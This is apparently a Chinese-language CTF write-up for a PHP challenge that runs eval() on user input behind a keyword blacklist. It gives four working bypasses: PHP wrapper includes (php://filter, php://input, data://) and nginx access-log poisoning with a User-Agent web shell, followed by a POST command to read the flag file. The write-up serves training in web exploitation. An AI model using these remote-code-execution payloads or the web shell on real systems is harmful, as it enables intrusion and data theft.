```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

分析源码

过滤了

flag

system

php

cat

sort

shell

.

空格

'

`

echo

;

(

:

"

<

=



还是利用之前的payload



## 第一种

include结合php://filter

```
?c=include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250402182748390](./assets/image-20250402182748390.png)

![image-20250402182743573](./assets/image-20250402182743573.png)





## 第二种

include结合php://input

GET

```
?c=include$_GET[a]?>&a=php://input
```

POST

```
<?php system("cat flag.php")?>
```

![image-20250402182841464](./assets/image-20250402182841464.png)





## 第三种

include结合data://text/plain

```
?c=include$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
```

![image-20250402183037027](./assets/image-20250402183037027.png)



## 第四种

日志注入

```
?c=include$_GET[a]?>&a=../../../../../var/log/nginx/access.log
```

![image-20250402183119973](./assets/image-20250402183119973.png)

bp抓包，修改UA头

```
ra<?php @eval($_POST[a]);?>1n3
```

![image-20250402183308046](./assets/image-20250402183308046.png)

![image-20250402183321679](./assets/image-20250402183321679.png)

GET

```
?c=include$_GET[a]?>&a=../../../../../var/log/nginx/access.log
```

POST

```
a=system("cat flag.php");
```

![image-20250402183343540](./assets/image-20250402183343540.png)